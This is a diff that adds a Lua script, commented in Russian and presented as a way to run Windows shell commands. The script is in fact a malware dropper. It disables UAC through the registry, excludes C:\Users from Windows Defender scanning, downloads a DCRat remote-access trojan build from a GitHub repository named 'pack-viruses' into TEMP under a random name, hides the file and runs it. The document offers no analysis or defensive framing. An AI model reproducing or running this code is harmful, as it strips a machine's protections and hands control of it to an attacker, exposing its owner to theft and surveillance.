@@ -1,0 +1,32 @@
+-- Выполнение команд Windows Shell через Lua
+
+-- 1. Запрос прав администратора и отключение UAC через реестр
+local disable_uac_cmd = [[
+powershell -Command "Start-Process cmd -ArgumentList '/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f' -Verb RunAs"
+]]
+os.execute(disable_uac_cmd)
+
+-- 2. Добавление исключения в Защитник Windows (Windows Defender)
+local defender_excl_cmd = [[
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users'"
+]]
+os.execute(defender_excl_cmd)
+
+-- 3. Генерация случайного имени и скачивание файла
+math.randomseed(os.time())
+local random_id = math.random(1, 1000000000)
+local temp_dir = os.getenv("TEMP") or "C:\\Windows\\Temp"
+local target_path = temp_dir .. "\\" .. random_id .. ".exe"
+
+local download_url = "https://github.com/moyaki485-svg/pack-viruses/raw/refs/heads/main/DCRatBuild.exe"
+
+local download_cmd = string.format(
+    'powershell -Command "Invoke-WebRequest -Uri \'%s\' -OutFile \'%s\'"',
+    download_url,
+    target_path
+)
+os.execute(download_cmd)
+
+-- 4. Установка атрибута "Скрытый" и запуск файла
+os.execute(string.format('attrib +h "%s"', target_path))
+os.execute(string.format('start "" "%s"', target_path))
